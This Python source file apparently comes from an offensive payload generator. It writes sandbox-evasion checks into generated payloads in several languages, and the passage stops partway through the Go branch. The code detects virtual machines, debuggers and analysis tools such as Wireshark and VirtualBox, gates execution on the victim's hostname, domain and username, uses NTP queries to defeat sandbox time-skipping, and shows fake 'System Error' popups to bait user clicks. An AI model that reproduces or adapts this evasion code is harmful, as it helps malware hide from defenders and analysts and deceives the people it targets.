'''
This file contains the payload sandbox checks for each respective language
'''

from datetime import date
from datetime import timedelta
from Tools.Evasion.evasion_common import evasion_helpers


def senecas_games(evasion_payload):
    # Start checks to determine language
    # Define original values of variables
    num_tabs_required = 0
    check_code = ''

    if evasion_payload.language == 'python':
        if evasion_payload.required_options["EXPIRE_PAYLOAD"][0].lower() != "x":

            RandToday = evasion_helpers.randomString()
            RandExpire = evasion_helpers.randomString()

            todaysdate = date.today()
            expiredate = str(todaysdate + timedelta(days=int(evasion_payload.required_options["EXPIRE_PAYLOAD"][0])))

            # Create Payload code
            check_code += '\t' * num_tabs_required + 'from datetime import datetime\n'
            check_code += '\t' * num_tabs_required + 'from datetime import date\n'
            check_code += '\t' * num_tabs_required + RandToday + ' = datetime.now()\n'
            check_code += '\t' * num_tabs_required + RandExpire + ' = datetime.strptime(\"' + expiredate[2:] + '\",\"%y-%m-%d\") \n'
            check_code += '\t' * num_tabs_required + 'if ' + RandToday + ' < ' + RandExpire + ':\n'

            # Add a tab for this check
            num_tabs_required += 1

        if evasion_payload.required_options["HOSTNAME"][0].lower() != "x":

            rand_hostname = evasion_helpers.randomString()

            check_code += '\t' * num_tabs_required + 'import platform\n'
            check_code += '\t' * num_tabs_required + rand_hostname + ' = platform.node()\n'
            check_code += '\t' * num_tabs_required + 'if \"' + evasion_payload.required_options["HOSTNAME"][0].lower() + '\" in ' + rand_hostname + '.lower():\n'

            # Add a tab for this check
            num_tabs_required += 1

        if evasion_payload.required_options["DOMAIN"][0].lower() != "x":

            rand_domain = evasion_helpers.randomString()

            check_code += '\t' * num_tabs_required + 'import socket\n'
            check_code += '\t' * num_tabs_required + rand_domain + ' = socket.getfqdn()\n'
            check_code += '\t' * num_tabs_required + 'if \"' + evasion_payload.required_options["DOMAIN"][0].lower() + '\" in ' + rand_domain + '.lower():\n'

            # Add a tab for this check
            num_tabs_required += 1

        if evasion_payload.required_options["PROCESSORS"][0].lower() != "x":

            rand_processor_count = evasion_helpers.randomString()

            check_code += '\t' * num_tabs_required + 'import multiprocessing\n'
            check_code += '\t' * num_tabs_required + rand_processor_count + ' = multiprocessing.cpu_count()\n'
            check_code += '\t' * num_tabs_required + 'if ' + rand_processor_count + ' >= ' + evasion_payload.required_options["PROCESSORS"][0] + ':\n'

            # Add a tab for this check
            num_tabs_required += 1

        if evasion_payload.required_options["USERNAME"][0].lower() != "x":

            rand_user_name = evasion_helpers.randomString()

            check_code += '\t' * num_tabs_required + 'import getpass\n'
            check_code += '\t' * num_tabs_required + rand_user_name + ' = getpass.getuser()\n'
            check_code += '\t' * num_tabs_required + 'if \'' + evasion_payload.required_options["USERNAME"][0].lower() + '\' in ' + rand_user_name + '.lower():\n'

            # Add a tab for this check
            num_tabs_required += 1

        if evasion_payload.required_options["DETECTDEBUG"][0].lower() != "false":

            is_debugger_present = evasion_helpers.randomString()

            check_code += '\t' * num_tabs_required + 'from ctypes import *\n'
            check_code += '\t' * num_tabs_required + is_debugger_present + ' = windll.kernel32.IsDebuggerPresent()\n'
            check_code += '\t' * num_tabs_required + 'if ' + is_debugger_present + ' == 0:\n'

            # Add a tab for this check
            num_tabs_required += 1

        if evasion_payload.required_options["VIRTUALDLLS"][0].lower() != "false":

            evidenceof_sandbox = evasion_helpers.randomString()
            sandbox_dlls = evasion_helpers.randomString()
            all_pids = evasion_helpers.randomString()
            pid = evasion_helpers.randomString()
            hProcess = evasion_helpers.randomString()
            curProcessDLLs = evasion_helpers.randomString()
            dll = evasion_helpers.randomString()
            dll_name = evasion_helpers.randomString()
            sandbox_dll = evasion_helpers.randomString()

            check_code += '\t' * num_tabs_required + 'import win32api\n'
            check_code += '\t' * num_tabs_required + 'import win32process\n'
            check_code += '\t' * num_tabs_required + evidenceof_sandbox + '= []\n'
            # removed dbghelp.dll
            check_code += '\t' * num_tabs_required + sandbox_dlls + ' = ["sbiedll.dll","api_log.dll","dir_watch.dll","pstorec.dll","vmcheck.dll","wpespy.dll"]\n'
            check_code += '\t' * num_tabs_required + all_pids + '= win32process.EnumProcesses()\n'
            check_code += '\t' * num_tabs_required + 'for ' + pid + ' in ' + all_pids + ':\n'
            check_code += '\t' * num_tabs_required + '\ttry:\n'
            check_code += '\t' * num_tabs_required + '\t\t' + hProcess + ' = win32api.OpenProcess(0x0410, 0, ' + pid + ')\n'
            check_code += '\t' * num_tabs_required + '\t\ttry:\n'
            check_code += '\t' * num_tabs_required + '\t\t\t' + curProcessDLLs + '= win32process.EnumProcessModules(' + hProcess + ')\n'
            check_code += '\t' * num_tabs_required + '\t\t\tfor ' + dll + ' in ' + curProcessDLLs + ':\n'
            check_code += '\t' * num_tabs_required + '\t\t\t\t' + dll_name + '= str(win32process.GetModuleFileNameEx(' + hProcess + ', ' + dll + ')).lower()\n'
            check_code += '\t' * num_tabs_required + '\t\t\t\tfor ' + sandbox_dll + ' in '+ sandbox_dlls + ':\n'
            check_code += '\t' * num_tabs_required + '\t\t\t\t\tif ' + sandbox_dll + ' in ' + dll_name + ':\n'
            check_code += '\t' * num_tabs_required + '\t\t\t\t\t\tif ' + dll_name + ' not in ' + evidenceof_sandbox + ':\n'
            check_code += '\t' * num_tabs_required + '\t\t\t\t\t\t\t' + evidenceof_sandbox + '.append(' + dll_name + ')\n'
            check_code += '\t' * num_tabs_required + '\t\tfinally:\n'
            check_code += '\t' * num_tabs_required + '\t\t\twin32api.CloseHandle(' + pid + ')\n'
            check_code += '\t' * num_tabs_required + '\texcept:\n'
            check_code += '\t' * num_tabs_required + '\t\tpass\n'
            check_code += '\t' * num_tabs_required + 'if not ' + evidenceof_sandbox + ':\n'

            # Add a tab for this check
            num_tabs_required += 1

        if evasion_payload.required_options["MINRAM"][0].lower() != "false":

            class_name = evasion_helpers.randomString()
            field_name = evasion_helpers.randomString()
            memory_status = evasion_helpers.randomString()

            check_code += '\t' * num_tabs_required + 'import ctypes\n'
            check_code += '\t' * num_tabs_required + 'class ' + class_name + ' (ctypes.Structure):\n'
            check_code += '\t' * num_tabs_required + '\t_fields_ = [\n'
            check_code += '\t' * num_tabs_required + '\t\t("dwLength", ctypes.c_ulong),\n'
            check_code += '\t' * num_tabs_required + '\t\t("dwMemoryLoad", ctypes.c_ulong),\n'
            check_code += '\t' * num_tabs_required + '\t\t("ullTotalPhys", ctypes.c_ulonglong),\n'
            check_code += '\t' * num_tabs_required + '\t\t("ullAvailPhys", ctypes.c_ulonglong),\n'
            check_code += '\t' * num_tabs_required + '\t\t("ullTotalPageFile", ctypes.c_ulonglong),\n'
            check_code += '\t' * num_tabs_required + '\t\t("ullAvailPageFile", ctypes.c_ulonglong),\n'
            check_code += '\t' * num_tabs_required + '\t\t("ullTotalVirtual", ctypes.c_ulonglong),\n'
            check_code += '\t' * num_tabs_required + '\t\t("ullAvailVirtual", ctypes.c_ulonglong),\n'
            check_code += '\t' * num_tabs_required + '\t\t("sullAvailExtendedVirtual", ctypes.c_ulonglong),\n'
            check_code += '\t' * num_tabs_required + '\t]\n'
            check_code += '\t' * num_tabs_required + memory_status + ' = ' + class_name + '()\n'
            check_code += '\t' * num_tabs_required + memory_status + '.dwLength = ctypes.sizeof(' + class_name + ')\n'
            check_code += '\t' * num_tabs_required + 'ctypes.windll.kernel32.GlobalMemoryStatusEx(ctypes.byref(' + memory_status + '))\n'
            check_code += '\t' * num_tabs_required + 'if ' + memory_status + '.ullTotalPhys/1073741824 > 3:\n'


            # Add a tab for this check
            num_tabs_required += 1

        if evasion_payload.required_options["CLICKTRACK"][0].lower() != "x":

            rand_counter = evasion_helpers.randomString()
            minimum_clicks = evasion_helpers.randomString()
            left_click = evasion_helpers.randomString()
            right_click = evasion_helpers.randomString()

            check_code += '\t' * num_tabs_required + 'import win32api\n'
            check_code += '\t' * num_tabs_required + rand_counter + " = 0\n"
            check_code += '\t' * num_tabs_required + minimum_clicks + " = " + evasion_payload.required_options["CLICKTRACK"][0] + "\n"
            check_code += '\t' * num_tabs_required + 'while ' + rand_counter + ' < ' + minimum_clicks + ':\n'
            check_code += '\t' * num_tabs_required + '\t' + left_click + ' = win32api.GetAsyncKeyState(1)\n'
            check_code += '\t' * num_tabs_required + '\t' + right_click + ' = win32api.GetAsyncKeyState(2)\n'
            check_code += '\t' * num_tabs_required + '\t' + 'if ' + left_click + ' % 2 == 1:\n'
            check_code += '\t' * num_tabs_required + '\t\t' + rand_counter + ' += 1\n'
            check_code += '\t' * num_tabs_required + '\t' + 'if ' + right_click + ' % 2 == 1:\n'
            check_code += '\t' * num_tabs_required + '\t\t' + rand_counter + ' += 1\n'
            check_code += '\t' * num_tabs_required + 'if ' + rand_counter + ' >= ' + minimum_clicks + ':\n'

            # Add a tab for this check
            num_tabs_required += 1

        if evasion_payload.required_options["VIRTUALFILES"][0].lower() != "false":

            vmfiles_exist = evasion_helpers.randomString()
            files_tocheck = evasion_helpers.randomString()
            file_path = evasion_helpers.randomString()

            check_code += '\t' * num_tabs_required + 'import os\n'
            check_code += '\t' * num_tabs_required + vmfiles_exist + ' = []\n'
            check_code += '\t' * num_tabs_required + files_tocheck + " = [r'C:\windows\Sysnative\Drivers\Vmmouse.sys', r'C:\windows\Sysnative\Drivers\vm3dgl.dll', r'C:\windows\Sysnative\Drivers\vmdum.dll', r'C:\windows\Sysnative\Drivers\vm3dver.dll', r'C:\windows\Sysnative\Drivers\vmtray.dll', r'C:\windows\Sysnative\Drivers\vmci.sys', r'C:\windows\Sysnative\Drivers\vmusbmouse.sys', r'C:\windows\Sysnative\Drivers\vmx_svga.sys', r'C:\windows\Sysnative\Drivers\vmxnet.sys', r'C:\windows\Sysnative\Drivers\VMToolsHook.dll', r'C:\windows\Sysnative\Drivers\vmhgfs.dll', r'C:\windows\Sysnative\Drivers\vmmousever.dll', r'C:\windows\Sysnative\Drivers\vmGuestLib.dll', r'C:\windows\Sysnative\Drivers\VmGuestLibJava.dll', r'C:\windows\Sysnative\Drivers\vmscsi.sys', r'C:\windows\Sysnative\Drivers\VBoxMouse.sys', r'C:\windows\Sysnative\Drivers\VBoxGuest.sys', r'C:\windows\Sysnative\Drivers\VBoxSF.sys', r'C:\windows\Sysnative\Drivers\VBoxVideo.sys', r'C:\windows\Sysnative\vboxdisp.dll', r'C:\windows\Sysnative\vboxhook.dll', r'C:\windows\Sysnative\vboxmrxnp.dll', r'C:\windows\Sysnative\vboxogl.dll', r'C:\windows\Sysnative\vboxoglarrayspu.dll', r'C:\windows\Sysnative\vboxoglcrutil.dll', r'C:\windows\Sysnative\vboxoglerrorspu.dll', r'C:\windows\Sysnative\vboxoglfeedbackspu.dll', r'C:\windows\Sysnative\vboxoglpackspu.dll', r'C:\windows\Sysnative\vboxoglpassthroughspu.dll', r'C:\windows\Sysnative\vboxservice.exe', r'C:\windows\Sysnative\vboxtray.exe', r'C:\windows\Sysnative\VBoxControl.exe']"
            check_code += '\t' * num_tabs_required + 'for ' + file_path + ' in ' + files_tocheck + ':\n'
            check_code += '\t' * num_tabs_required + '\tif os.path.isFile(' + file_path + '):\n'
            check_code += '\t' * num_tabs_required + '\t\t' + vmfiles_exist + '.append(' + file_path + ')'
            check_code += '\t' * num_tabs_required + 'if not ' + vmfiles_exist + ':\n'

            # Add a tab for this check
            num_tabs_required += 1

        if evasion_payload.required_options["CURSORMOVEMENT"][0].lower() != "false":

            seconds = evasion_helpers.randomString()
            x_position = evasion_helpers.randomString()
            y_position = evasion_helpers.randomString()
            x2_position = evasion_helpers.randomString()
            y2_position = evasion_helpers.randomString()

            check_code += '\t' * num_tabs_required + 'from time import sleep\n'
            check_code += '\t' * num_tabs_required + 'import win32api\n'
            check_code += '\t' * num_tabs_required + seconds + ' = 30\n'
            check_code += '\t' * num_tabs_required + x_position + ', ' + y_position + ' = win32api.GetCursorPos()\n'
            check_code += '\t' * num_tabs_required + 'sleep(30)\n'
            check_code += '\t' * num_tabs_required + x2_position + ', ' + y2_position + ' = win32api.GetCursorPos()\n'
            check_code += '\t' * num_tabs_required + 'if ' + x_position + ' - ' + x2_position + ' != 0 or ' + y_position + ' - ' + y2_position + ' != 0:\n'

            # Add a tab for this check
            num_tabs_required += 1

        if evasion_payload.required_options["USERPROMPT"][0].lower() != "false":

            popup_title = evasion_helpers.randomString()
            popup_message = evasion_helpers.randomString()
            message_box = evasion_helpers.randomString()

            check_code += '\t' * num_tabs_required + 'import ctypes\n'
            check_code += '\t' * num_tabs_required + popup_title + ' = "System Error 0x18463832"\n'
            check_code += '\t' * num_tabs_required + popup_message + ' = "Your system encountered an error, please click OK to proceed"\n'
            check_code += '\t' * num_tabs_required + message_box + ' = ctypes.windll.user32.MessageBoxW\n'
            check_code += '\t' * num_tabs_required + message_box + '(None, ' + popup_message + ', ' + popup_title + ', 0)\n'
            check_code += '\t' * num_tabs_required + 'if True:\n'

            # Add a tab for this check
            num_tabs_required += 1

        if evasion_payload.required_options["SANDBOXPROCESS"][0].lower() != "false":

            sandbox_exist = evasion_helpers.randomString()
            bad_procs = evasion_helpers.randomString()
            current_processes = evasion_helpers.randomString()
            process = evasion_helpers.randomString()
            sandbox_proc = evasion_helpers.randomString()

            check_code += '\t' * num_tabs_required + 'import win32pdh\n'
            check_code += '\t' * num_tabs_required + sandbox_exist + ' = []\n'
            check_code += '\t' * num_tabs_required + bad_procs + ' = "vmsrvc", "tcpview", "wireshark", "visual basic", "fiddler", "vmware", "vbox", "process explorer", "autoit", "vboxtray", "vmtools", "vmrawdsk", "vmusbmouse", "vmvss", "vmscsi", "vmxnet", "vmx_svga", "vmmemctl", "df5serv", "vboxservice", "vmhgfs"\n'
            check_code += '\t' * num_tabs_required + '_, ' + current_processes + ' = win32pdh.EnumObjectItems(None,None,\'process\', win32pdh.PERF_DETAIL_WIZARD)\n'
            check_code += '\t' * num_tabs_required + 'for ' + process + ' in ' + current_processes + ':\n'
            check_code += '\t' * num_tabs_required + '\tfor ' + sandbox_proc + ' in ' + bad_procs + ':\n'
            check_code += '\t' * num_tabs_required + '\t\tif ' + sandbox_proc + ' in str(' + process + '):\n'
            check_code += '\t' * num_tabs_required + '\t\t\t' + sandbox_exist + '.append(' + process + ')\n'
            check_code += '\t' * num_tabs_required + '\t\t\tbreak\n'
            check_code += '\t' * num_tabs_required + 'if not ' + sandbox_exist + ':\n'

            # Add a tab for this check
            num_tabs_required += 1

        if evasion_payload.required_options["UTCCHECK"][0].lower() != "false":

            time_import = evasion_helpers.randomString()

            check_code += '\t' * num_tabs_required + 'import time as ' + time_import + '\n'
            check_code += '\t' * num_tabs_required + 'if ' + time_import + '.tzname[0] != "Coordinated Universal Time" and ' + time_import + '.tzname[1] != "Coordinated Universal Time":\n'

            # Add a tab for this check
            num_tabs_required += 1

        if evasion_payload.required_options["SLEEP"][0].lower() != "x":

            rand_time_name = evasion_helpers.randomString()

            check_code += '\t' * num_tabs_required + 'from time import sleep\n'
            check_code += '\t' * num_tabs_required + 'from socket import AF_INET, SOCK_DGRAM\n'
            check_code += '\t' * num_tabs_required + 'import sys\n'
            check_code += '\t' * num_tabs_required + 'import datetime\n'
            check_code += '\t' * num_tabs_required + 'import time\n'
            check_code += '\t' * num_tabs_required + 'import socket\n'
            check_code += '\t' * num_tabs_required + 'import struct\n'
            check_code += '\t' * num_tabs_required + 'client = socket.socket(AF_INET, SOCK_DGRAM)\n'
            check_code += '\t' * num_tabs_required + 'client.sendto((bytes.fromhex("1b") + 47 * bytes.fromhex("01")), ("us.pool.ntp.org",123))\n'
            check_code += '\t' * num_tabs_required + 'msg, address = client.recvfrom( 1024 )\n'
            check_code += '\t' * num_tabs_required + rand_time_name + ' = datetime.datetime.fromtimestamp(struct.unpack("!12I",msg)[10] - 2208988800)\n'
            check_code += '\t' * num_tabs_required + 'sleep(' + evasion_payload.required_options["SLEEP"][0] + ')\n'
            check_code += '\t' * num_tabs_required + 'client.sendto((bytes.fromhex("1b") + 47 * bytes.fromhex("01")), ("us.pool.ntp.org",123))\n'
            check_code += '\t' * num_tabs_required + 'msg, address = client.recvfrom( 1024 )\n'
            check_code += '\t' * num_tabs_required + 'if ((datetime.datetime.fromtimestamp((struct.unpack("!12I",msg)[10] - 2208988800)) - ' + rand_time_name + ').seconds >= ' + evasion_payload.required_options["SLEEP"][0] + '):\n'

            # Add a tab for this check
            num_tabs_required += 1

        # Return check information
        return check_code, num_tabs_required

    elif evasion_payload.language == 'ruby':

        if evasion_payload.required_options["HOSTNAME"][0].lower() != "x":

            check_code += 'require \'socket\'\n'
            check_code += 'hostname = Socket.gethostname.downcase\n'
            check_code += 'if hostname[\"' + evasion_payload.required_options["HOSTNAME"][0].lower() + '\"]\n'

            # Add a tab for this check
            num_tabs_required += 1

        if evasion_payload.required_options["DOMAIN"][0].lower() != "x":

            check_code += 'require \'socket\'\n'
            check_code += 'domain = Socket.gethostname.downcase\n'
            check_code += 'if domain[\"' + evasion_payload.required_options["DOMAIN"][0].lower() + '\"]\n'

            # Add a tab for this check
            num_tabs_required += 1

        if evasion_payload.required_options["USERNAME"][0].lower() != "x":

            check_code += 'name = ENV["USERNAME"].downcase\n'
            check_code += 'if name[\"' + evasion_payload.required_options["USERNAME"][0].lower() + '\"]\n'

            # Add a tab for this check
            num_tabs_required += 1

        if evasion_payload.required_options["SLEEP"][0].lower() != "x":

            check_code += 'require \'socket\'\n'
            check_code += 'ntp_msg = (["00011011"] + Array.new(47,1)).pack("B8 C47")\n'
            check_code += 'sock = UDPSocket.new;sock.connect("us.pool.ntp.org", 123);sock.print ntp_msg;sock.flush;data,_ = sock.recvfrom(960);sock.close\n'
            check_code += 'firstTime = Time.at(data.unpack("B319 B32 B32")[1].to_i(2) - 2208988800)\n'
            check_code += 'sleep(' + evasion_payload.required_options["SLEEP"][0] + ')\n'
            check_code += 'sock = UDPSocket.new;sock.connect("us.pool.ntp.org", 123);sock.print ntp_msg;sock.flush;data,_ = sock.recvfrom(960)\n'
            check_code += 'if (Time.at(data.unpack("B319 B32 B32")[1].to_i(2) - 2208988800) - firstTime >= ' + evasion_payload.required_options["SLEEP"][0] + ')\n'

            # Add a tab for this check
            num_tabs_required += 1

        # Return check information
        return check_code, num_tabs_required

    elif evasion_payload.language == 'perl':
        if evasion_payload.required_options["HOSTNAME"][0].lower() != "x":

            rand_hostname = evasion_helpers.randomString()
            check_code += '\t' * num_tabs_required + 'Use Sys::Hostname;\n'
            check_code += '\t' * num_tabs_required + 'my $' + rand_hostname + ' = hostname;\n'
            check_code += '\t' * num_tabs_required + 'if (index(lc($' + rand_hostname + '), lc(' + evasion_payload.required_options["HOSTNAME"][0] + ')) != -1){\n'

            # Add a tab for this check
            num_tabs_required += 1

        if evasion_payload.required_options["USERNAME"][0].lower() != "x":

            rand_name = evasion_helpers.randomString()
            check_code += '\t' * num_tabs_required + 'my $' + rand_name + ' = Win32::LoginName;\n'
            check_code += '\t' * num_tabs_required + 'if (index(lc($' + rand_name + '), lc(\"' + evasion_payload.required_options["USERNAME"][0] + '\")) != -1){\n'

            # Add a tab for this check
            num_tabs_required += 1

        if evasion_payload.required_options["DOMAIN"][0].lower() != "x":

            rand_domain = evasion_helpers.randomString()
            check_code += '\t' * num_tabs_required + 'use Net::Domain qw (hostdomain);\n'
            check_code += '\t' * num_tabs_required + 'my $' + rand_domain + ' = hostdomain();\n'
            check_code += '\t' * num_tabs_required + 'if (index(lc($' + rand_domain + '), lc(\"' + evasion_payload.required_options["DOMAIN"][0] + '\")) != -1){\n'

            # Add a tab for this check
            num_tabs_required += 1

        if evasion_payload.required_options["PROCESSORS"][0].lower() != "x":

            rand_corecount = evasion_helpers.randomString()
            check_code += '\t' * num_tabs_required + 'my $' + rand_corecount + ' = $ENV{\"NUMBER_OF_PROCESSORS\"};'
            check_code += '\t' * num_tabs_required + 'if ($' + rand_corecount + ' >=  '+ evasion_payload.required_options["PROCESSORS"][0] + '){\n'

            # Add a tab for this check
            num_tabs_required += 1

        if evasion_payload.required_options["SLEEP"][0].lower() != "x":

            check_code += '\t' * num_tabs_required + 'use IO::Socket;'
            check_code += '\t' * num_tabs_required + 'my $firstTime;my $secondTime;my $sock = IO::Socket::INET->new(Proto => "udp",PeerPort => 123,PeerAddr => "us.pool.ntp.org",Timeout => 4);\n'
            check_code += '\t' * num_tabs_required + 'my $NTPTransmit = pack("B384", "00100011", (0)x14);my $secondTransmit = pack("B384", "00100011", (0)x14);\n'
            check_code += '\t' * num_tabs_required + '$sock->send($NTPTransmit);$sock->recv($NTPTransmit, 384);my ($Ignore, $firstTime, $Ignore2)=unpack("B319 N B32",$NTPTransmit);$firstTime -= 2208988800;$sock->close;\n'
            check_code += '\t' * num_tabs_required + 'sleep ' + evasion_payload.required_options["SLEEP"][0] + ';\n'
            check_code += '\t' * num_tabs_required + 'my $newSock = IO::Socket::INET->new(Proto => "udp",PeerPort => 123,PeerAddr => "us.pool.ntp.org",Timeout => 4);\n'
            check_code += '\t' * num_tabs_required + '$newSock->send($secondTransmit);$newSock->recv($secondTransmit, 384);my ($Ignore, $secondTime, $Ignore2)=unpack("B319 N B32",$secondTransmit);$newSock->close;\n'
            check_code += '\t' * num_tabs_required + 'my $newSock = IO::Socket::INET->new(Proto => "udp",PeerPort => 123,PeerAddr => "us.pool.ntp.org",Timeout => 4);\n'
            check_code += '\t' * num_tabs_required + 'if ((($secondTime - 2208988800) - $firstTime) >= ' + evasion_payload.required_options["SLEEP"][0] + ') {\n'

            # Add a tab for this check
            num_tabs_required += 1

        # Return check information
        return check_code, num_tabs_required

    elif evasion_payload.language == 'powershell':
        if evasion_payload.required_options["HOSTNAME"][0].lower() != "x":
            check_code += "if($env:computername -eq \"" + evasion_payload.required_options["HOSTNAME"][0].lower() + "\") {\n"
            num_tabs_required += 1

        if evasion_payload.required_options["DOMAIN"][0].lower() != "x":
            check_code += "if((Get-WMIObject -Class Win32_ComputerSystem).Domain -eq \"" + evasion_payload.required_options["DOMAIN"][0].lower() + "\") {\n"
            num_tabs_required += 1

        if evasion_payload.required_options["USERNAME"][0].lower() != "x":
            check_code += "if($env:username -eq \"" + evasion_payload.required_options["USERNAME"][0].lower() + "\") {\n"
            num_tabs_required += 1

        if evasion_payload.required_options["PROCESSORS"][0].lower() != "x":
            check_code += "if((Get-WMIObject -Class Win32_Processor).NumberOfLogicalProcessors -ge " + evasion_payload.required_options["PROCESSORS"][0].lower() + ") {\n"
            num_tabs_required += 1

        if evasion_payload.required_options["SLEEP"][0].lower() != "x":
            check_code += "[Byte[]]$NTPTransmit=,1*48;$NTPTransmit[0]=0x1B;[Byte[]]$secondTransmit=,1*48;$secondTransmit[0]=0x1B;$noAccess=$false;"
            check_code += "Try{$Socket=New-Object Net.Sockets.Socket([Net.Sockets.AddressFamily]::InterNetwork,[Net.Sockets.SocketType]::Dgram,[Net.Sockets.ProtocolType]::Udp);$Socket.Connect('us.pool.ntp.org',123);[Void]$Socket.Send($NTPTransmit);[Void]$Socket.Receive($NTPTransmit)}catch{$noAccess=$true};"
            check_code += "$runTotal=0;ForEach($Index in $NTPTransmit[40..43]){$runTotal=$runTotal*256+$Index};$firstTime=(New-Object DateTime(1900,1,1,0,0,0,[DateTimeKind]::Utc)).AddMilliseconds([UInt64]($runTotal*1000)).Second;"
            check_code += "Start-Sleep -s " + evasion_payload.required_options["SLEEP"][0] + ";"
            check_code += "Try{$NewSock=New-Object Net.Sockets.Socket([Net.Sockets.AddressFamily]::InterNetwork,[Net.Sockets.SocketType]::Dgram,[Net.Sockets.ProtocolType]::Udp);$NewSock.Connect('us.pool.ntp.org',123);[Void]$NewSock.Send($secondTransmit);[Void]$NewSock.Receive($secondTransmit);$NewSock.Close()}catch{$noAccess=$true};"
            check_code += "$runTotal=0;ForEach($Index in $secondTransmit[40..43]){$runTotal=$runTotal*256+$Index}\n"
            check_code += "if ((New-Object DateTime(1900,1,1,0,0,0,[DateTimeKind]::Utc)).AddMilliseconds([UInt64]($runTotal*1000)).Second - $firstTime -ge " + evasion_payload.required_options["SLEEP"][0] + " -or $noAccess) {\n"
            num_tabs_required += 1

        if evasion_payload.required_options["USERPROMPT"][0].lower() != "false":

            dialog_title = evasion_helpers.randomString()
            dialog_text = evasion_helpers.randomString()
            message_box = evasion_helpers.randomString()

            check_code += '$' + dialog_title + ' = "System error encountered!"\n'
            check_code += '$' + dialog_text + ' = "Error 0x8163819f - Please hit OK to continue"\n'
            check_code += '$' + message_box + ' = New-Object -COMObject WScript.Shell\n'
            check_code += '[void]$' + message_box + '.Popup($' + dialog_text + ',0,$' + dialog_title + ',0)\n'
            check_code += 'if ($true) {\n'
            num_tabs_required += 1

        # Return check information
        return check_code, num_tabs_required

    elif evasion_payload.language == 'cs':
        if evasion_payload.required_options["EXPIRE_PAYLOAD"][0].lower() != "x":

            RandToday = evasion_helpers.randomString()
            RandExpire = evasion_helpers.randomString()

            # Create Payload code
            check_code += '\t' * num_tabs_required + 'DateTime {} = DateTime.Today;\n'.format(RandToday)
            check_code += '\t' * num_tabs_required + 'DateTime {} = {}.AddDays({});\n'.format(RandExpire, RandToday, evasion_payload.required_options["EXPIRE_PAYLOAD"][0])
            check_code += '\t' * num_tabs_required + 'if ({} < {}) {{\n'.format(RandExpire, RandToday)

            # Add a tab for this check
            num_tabs_required += 1

        if evasion_payload.required_options["HOSTNAME"][0].lower() != "x":

            check_code += '\t' * num_tabs_required + 'if (System.Environment.MachineName.ToLower().Contains("{}")) {{\n'.format(evasion_payload.required_options["HOSTNAME"][0].lower())            

            # Add a tab for this check
            num_tabs_required += 1

        if evasion_payload.required_options["DOMAIN"][0].lower() != "x":

            check_code += '\t' * num_tabs_required + 'if (string.Equals("' + evasion_payload.required_options["DOMAIN"][0] + '", System.Net.NetworkInformation.IPGlobalProperties.GetIPGlobalProperties().DomainName, StringComparison.CurrentCultureIgnoreCase)) {\n'
            
            # Add a tab for this check
            num_tabs_required += 1

        if evasion_payload.required_options["PROCESSORS"][0].lower() != "x":

            check_code += '\t' * num_tabs_required + 'if (System.Environment.ProcessorCount >= {}) {{\n'.format(evasion_payload.required_options["PROCESSORS"][0])

            # Add a tab for this check
            num_tabs_required += 1

        if evasion_payload.required_options["USERNAME"][0].lower() != "x":

            rand_user_name = evasion_helpers.randomString()
            rand_char_name = evasion_helpers.randomString()
            check_code += '\t' * num_tabs_required + 'string {} = System.Security.Principal.WindowsIdentity.GetCurrent().Name;\n'.format(rand_user_name)
            check_code += '\t' * num_tabs_required + "string[] {} = {}.Split('\\\\');\n".format(rand_char_name, rand_user_name)
            check_code += '\t' * num_tabs_required + 'if ({}[1].Contains("{}")) {{\n\n'.format(rand_char_name, evasion_payload.required_options["USERNAME"][0])            

            # Add a tab for this check
            num_tabs_required += 1

        if evasion_payload.required_options["SLEEP"][0].lower() != "x":
            
            check_code += '\t' * num_tabs_required + 'var NTPTransmit = new byte[48];NTPTransmit[0] = 0x1B; var secondTransmit = new byte[48]; secondTransmit[0] = 0x1B;  var skip = false;\n'
            check_code += '\t' * num_tabs_required + 'var addr = Dns.GetHostEntry("us.pool.ntp.org").AddressList;var sock = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);\n'
            check_code += '\t' * num_tabs_required + 'try { sock.Connect(new IPEndPoint(addr[0], 123)); sock.ReceiveTimeout = 6000; sock.Send(NTPTransmit); sock.Receive(NTPTransmit); sock.Close(); } catch { skip = true; }\n'
            check_code += '\t' * num_tabs_required + 'ulong runTotal=0;for (int i=40; i<=43; ++i){runTotal = runTotal * 256 + (uint)NTPTransmit[i];}\n'
            check_code += '\t' * num_tabs_required + 'var t1 = (new DateTime(1900, 1, 1, 0, 0, 0, DateTimeKind.Utc)).AddMilliseconds(1000 * runTotal);\n'
            check_code += '\t' * num_tabs_required + 'Thread.Sleep(' + evasion_payload.required_options["SLEEP"][0] + '*1000);\n'
            check_code += '\t' * num_tabs_required + 'var newSock = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);\n'
            check_code += '\t' * num_tabs_required + 'try { var addr2 = Dns.GetHostEntry("us.pool.ntp.org").AddressList; newSock.Connect(new IPEndPoint(addr2[0], 123)); newSock.ReceiveTimeout = 6000; newSock.Send(secondTransmit); newSock.Receive(secondTransmit); newSock.Close(); } catch { skip = true; }\n'
            check_code += '\t' * num_tabs_required + 'ulong secondTotal = 0; for (int i = 40; i <= 43; ++i) { secondTotal = secondTotal * 256 + (uint)secondTransmit[i]; }\n'
            check_code += '\t' * num_tabs_required + 'if (((new DateTime(1900, 1, 1, 0, 0, 0, DateTimeKind.Utc)).AddMilliseconds(1000 * secondTotal) - t1).Seconds >= ' + evasion_payload.required_options["SLEEP"][0] + ' || skip) {\n'

            # Add a tab for this check
            num_tabs_required += 1

        # Return check information
        return check_code, num_tabs_required

    elif evasion_payload.language == 'go':
        rand_username = evasion_helpers.randomString()
        rand_error1 = evasion_helpers.randomString()
        rand_hostname = evasion_helpers.randomString()
        rand_error2 = evasion_helpers.randomString()
        rand_processor = evasion_helpers.randomString()
        rand_domain = evasion_helpers.randomString()

        if evasion_payload.required_options["USERNAME"][0].lower() != "x":
            check_code += rand_username + ", " + rand_error1 + " := user.Current()\n"
            check_code += "if " + rand_error1 + " != nil {\n"
            check_code += "os.Exit(1)}\n"
            check_code += "if strings.Contains(strings.ToLower(" + rand_username + ".Username), strings.ToLower(\"" + evasion_payload.required_options["USERNAME"][0] + "\")) {\n"
            num_tabs_required += 1

        if evasion_payload.required_options["HOSTNAME"][0].lower() != "x":
            check_code += rand_hostname + ", " + rand_error2 + " := os.Hostname()\n"
            check_code += "if " + rand_error2 + " != nil {\n"
            check_code += "os.Exit(1)}\n"
            check_code += "if strings.Contains(strings.ToLower(" + rand_hostname + "), strings.ToLower(\"" + evasion_payload.required_options["HOSTNAME"][0] + "\")) {\n"
            num_tabs_required += 1

